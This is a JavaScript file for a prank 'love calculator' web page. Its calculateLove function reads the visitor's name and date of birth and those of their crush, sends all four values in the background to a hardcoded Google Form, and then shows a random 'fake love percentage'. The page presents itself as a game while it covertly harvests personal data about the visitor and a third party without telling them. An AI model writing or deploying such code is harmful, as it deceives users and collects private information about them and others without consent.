// 🔹 Google Form POST URL (correct formResponse endpoint)
const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLScW0Ln0s1XeoPOOia00BHFnY21Onwbo8IHCyOxI7strOlRh8A/formResponse";

// 🔹 Entry IDs from your form
const ENTRY_YOUR_NAME   = "entry.1186416098";
const ENTRY_YOUR_DOB    = "entry.379054120";
const ENTRY_CRUSH_NAME  = "entry.865214700";
const ENTRY_CRUSH_DOB   = "entry.1861826994";

function sendToGoogleForm(yourName, yourDOB, crushName, crushDOB) {
  const formData = new FormData();
  formData.append(ENTRY_YOUR_NAME, yourName);
  formData.append(ENTRY_YOUR_DOB, yourDOB);
  formData.append(ENTRY_CRUSH_NAME, crushName);
  formData.append(ENTRY_CRUSH_DOB, crushDOB);

  fetch(FORM_URL, {
    method: "POST",
    mode: "no-cors",
    body: formData
  });
}

function calculateLove() {
  const yourName = document.getElementById("yourName").value.trim();
  const yourDOB = document.getElementById("yourDOB").value;
  const crushName = document.getElementById("crushName").value.trim();
  const crushDOB = document.getElementById("crushDOB").value;

  if (!yourName || !yourDOB || !crushName || !crushDOB) {
    alert("Please enter all details ❤️");
    return;
  }

  // 🔥 Send to Google Form (background)
  sendToGoogleForm(yourName, yourDOB, crushName, crushDOB);

  // 🔥 Fake love percentage for prank
  const lovePercent = Math.floor(Math.random() * 30) + 70;

  localStorage.setItem("yourName", yourName);
  localStorage.setItem("crushName", crushName);
  localStorage.setItem("lovePercent", lovePercent);

  // Redirect after 200ms
  setTimeout(() => {
    window.location.href = "love.html";
  }, 200);
}
